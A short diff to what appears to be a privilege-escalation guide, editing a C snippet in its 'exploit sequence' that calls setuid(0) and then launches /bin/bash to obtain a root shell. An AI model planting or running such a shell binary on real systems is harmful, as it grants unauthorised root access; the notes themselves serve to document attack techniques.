@@ -326,9 +326,10 @@ The exploit sequence is as follow:
    can be used ([General] Shells note):
 
    ```
-   #include<stdlib.h>
+   #include <stdlib.h>
+   #include <unistd.h>
 
-   main () {
+   void main () {
      setuid(0);
      system("/bin/bash");
    }
